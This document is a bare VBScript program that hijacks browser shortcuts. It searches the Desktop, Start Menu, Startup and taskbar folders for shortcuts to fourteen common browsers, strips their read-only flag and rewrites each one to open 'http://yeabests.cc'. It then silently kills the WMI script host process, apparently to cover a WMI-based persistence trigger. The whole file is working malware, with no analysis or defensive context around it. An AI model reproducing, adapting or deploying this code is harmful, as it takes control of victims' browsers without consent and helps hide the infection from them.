Dim objFS
Set objFS = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
Const link = "http://yeabests.cc"
browsers = Array("IEXPLORE.EXE", "chrome.exe", "firefox.exe", "360chrome.exe", "360SE.exe", "SogouExplorer.exe", "opera.exe", "Safari.exe", "Maxthon.exe", "TTraveler.exe", "TheWorld.exe", "baidubrowser.exe", "liebao.exe", "QQBrowser.exe")
Set BrowserDic = CreateObject("scripting.dictionary")
For Each browser In browsers
 BrowserDic.Add LCase(browser), browser
Next
Dim FoldersDic(12)
Set WshShell = CreateObject("Wscript.Shell")
FoldersDic(0) = "C:\Users\Public\Desktop"
FoldersDic(1) = "C:\ProgramData\Microsoft\Windows\Start Menu"
FoldersDic(2) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
FoldersDic(3) = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
FoldersDic(4) = "C:\Users\Rafael\Desktop"
FoldersDic(5) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Windows\Start Menu"
FoldersDic(6) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
FoldersDic(7) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
FoldersDic(8) = "C:\Users\Rafael\AppData\Roaming"
FoldersDic(9) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch"
FoldersDic(10) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu"
FoldersDic(11) = "C:\Users\Rafael\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"
Set fso = CreateObject("Scripting.Filesystemobject")
For i = 0 To UBound(FoldersDic)
 For Each file In fso.GetFolder(FoldersDic(i)).Files
  If LCase(fso.GetExtensionName(file.Path)) = "lnk" Then
   set oShellLink = WshShell.CreateShortcut(file.Path)
   path = oShellLink.TargetPath
   name = fso.GetBaseName(path) & "." & fso.GetExtensionName(path)
   If BrowserDic.Exists(LCase(name)) Then
    oShellLink.Arguments = link
    If file.Attributes And 1 Then
     file.Attributes = file.Attributes - 1
    End If
    oShellLink.Save
   End If
  End If
 Next
Next
createobject("wscript.shell").run "cmd /c taskkill /f /im scrcons.exe", 0